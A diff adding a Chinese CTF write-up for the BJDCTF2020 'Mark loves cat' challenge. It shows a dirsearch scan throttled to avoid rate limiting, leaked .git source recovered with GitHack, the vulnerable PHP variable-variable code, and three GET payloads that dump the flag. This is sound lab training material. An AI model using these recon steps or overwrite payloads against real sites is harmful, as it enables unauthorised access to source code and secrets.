@@ -3164,7 +3164,153 @@ array(18) {
 
 ![img](CTF.assets/2541080-20211014131709032-1238913099.png)
 
+## BUUOJ [BJDCTF2020]Mark loves cat
 
+### 1. 复现
+
+#### 1.1 信息搜集
+
+`dirsearch`扫描发现`git`文件泄露，下面这种参数写法，将线程改为1，超时时间该为2秒，并屏蔽`400,403,404,500,503,429`状态码可有效绕过BUUOJ 状态码 429 的问题
+
+```php
+┌──(root㉿kali)-[/home/kali/ctfTool/web/Git_Extract]
+└─# dirsearch -u http://916818cf-4af8-4998-904e-ba3ac6275bac.node4.buuoj.cn:81/ -t 1 --timeout=2 -x 400,403,404,500,503,429
+
+[09:29:26] 301 -  169B  - /.git  ->  http://916818cf-4af8-4998-904e-ba3ac6275bac.node4.buuoj.cn/.git/
+[09:29:26] 200 -    5B  - /.git/COMMIT_EDITMSG                              
+[09:29:26] 200 -  137B  - /.git/config
+[09:29:26] 200 -   73B  - /.git/description
+[09:29:26] 200 -   23B  - /.git/HEAD                                        
+[09:29:27] 200 -    6KB - /.git/index                                       
+[09:31:37] 301 -  169B  - /assets  ->  http://916818cf-4af8-4998-904e-ba3ac6275bac.node4.buuoj.cn/assets/
+[09:32:52] 200 -    0B  - /flag.php  
+```
+
+使用`Githack`获取文件
+
+```bash
+┌──(root㉿kali)-[/home/kali/ctfTool/web/GitHack]
+└─# python GitHack.py http://02595af5-036a-4cbd-88be-46238bd5d779.node4.buuoj.cn:81/.git/
+
+```
+
+成功拿到源码文件，这里我前面几次跑都没有拿到源码；所以如果这里拿不到源码的话就多试几次
+
+![image-20231124012506345](CTF.assets/image-20231124012506345.png)
+
+**源码 index.php**
+
+```php
+<?php
+
+include 'flag.php';
+
+$yds = "dog";
+$is = "cat";
+$handsome = 'yds';
+
+foreach($_POST as $x => $y){
+    $$x = $y;
+}
+
+foreach($_GET as $x => $y){         
+    $$x = $$y;
+}
+
+foreach($_GET as $x => $y){
+    if($_GET['flag'] === $x && $x !== 'flag'){
+        exit($handsome);
+    }
+}
+
+if(!isset($_GET['flag']) && !isset($_POST['flag'])){
+    exit($yds);
+}
+
+if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
+    exit($is);
+}
+
+
+
+echo "the flag is: ".$flag;
+var_dump($flag);
+```
+
+**源码 flag.php**
+
+```php
+<?php
+$flag = file_get_contents('/flag');  
+```
+
+### 1.2 解法一
+
+注意这块代码，目标是让：`$handsome=$flag`。这样就可以将`flag`取出
+
+1. 令：`$x = 'handsome'`
+2. 得：`$$x = $handsome`
+3. 令：`$y = 'flag'`
+4. 得：`$$y = $flag`
+5. 因：` $$x = $$y`
+6. 所以：`$handsome=$flag`
+7. 最后payload：`?handsome=flag&flag=handsome`；GET传参！
+
+```php
+foreach($_GET as $x => $y){         
+    $$x = $$y;
+}
+
+foreach($_GET as $x => $y){
+    if($_GET['flag'] === $x && $x !== 'flag'){
+        exit($handsome);
+    }
+}
+```
+
+### 1.3 解法二
+
+注意这块代码，目标是让：`$yds=$flag`
+
+1. 令：`$x = 'yds'`
+2. 得：`$$x = $yds`
+3. 令：`$y ='flag'`
+4. 得：`$$y = $flag`
+5. 因：`$$x = $$y`
+6. 所以：`$yds = $flag`
+7. 最后payload：`?yds=flag`；GET传参！
+
+```php
+foreach($_GET as $x => $y){       
+    $$x = $$y;
+}
+
+if(!isset($_GET['flag']) && !isset($_POST['flag'])){
+    exit($yds);
+}
+```
+
+### 1.4 解法三
+
+注意这块代码，目标是让：`$is=$flag`
+
+1. 令：`$x = 'is' `
+2. 得：`$$x = $is`
+3. 令：`$y = 'flag'`
+4. 得：`$$y = $flag`
+5. 因：`$$x = $$y`
+6. 所以：`$is = $flag`
+7. 最后payload：`?is=flag&flag=flag`；最后的`flag=flag`仅仅为了满足第五行的if判断；GET传参
+
+```php
+foreach($_GET as $x => $y){       
+    $$x = $$y;
+}
+
+if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
+    exit($is);
+}
+```
 
 # Misc
 
